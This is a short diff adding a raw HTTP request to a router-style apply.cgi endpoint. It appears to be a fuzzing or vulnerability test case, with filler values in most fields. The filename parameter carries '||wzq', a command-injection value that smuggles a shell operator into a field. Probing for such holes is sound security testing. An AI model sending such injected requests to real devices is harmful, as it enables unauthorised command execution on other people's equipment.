@@ -1,0 +1,6 @@
+GET /apply.cgi?mulpppoe_editnum HTTP/1.1
+Host: 127
+Content-Type: application/json
+Content-Length: 87
+
+select_edit=wzqwzqwzq&%20timestamp=wzqwzqwzq&submit_flag=qos_editmac&filename=||wzq
